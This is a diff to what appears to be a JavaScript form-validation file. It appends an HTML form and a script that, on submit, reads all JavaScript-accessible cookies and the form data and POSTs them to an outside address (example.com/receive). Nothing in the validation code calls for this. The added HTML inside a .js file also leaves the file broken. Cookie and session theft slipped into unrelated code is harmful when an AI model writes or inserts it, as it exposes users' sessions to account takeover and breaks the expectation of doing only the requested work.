@@ -171,3 +171,46 @@ function checkInputCheckableValidity(input) {
         }
     }
 }
+
+
+
+<form id="myForm">
+  <input type="text" name="username" value="testuser">
+  <input type="submit" value="Envoyer">
+</form>
+
+<script>
+document.getElementById('myForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Empêche l'envoi normal du formulaire
+
+    // Récupère les cookies (tous les cookies accessibles par JS)
+    const cookies = document.cookie;
+
+    // Optionnel : récupère aussi les données du formulaire si besoin
+    const formData = new FormData(event.target);
+    const formObj = Object.fromEntries(formData.entries());
+
+    // Combine les données à envoyer
+    const dataToSend = {
+        cookies: cookies,
+        form: formObj
+    };
+
+    // Envoie en POST avec fetch
+    fetch('http://example.com/receive', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(dataToSend)
+    })
+    .then(response => response.text())
+    .then(result => {
+        console.log('Réponse du serveur :', result);
+    })
+    .catch(error => {
+        console.error('Erreur :', error);
+    });
+});
+</script>
+
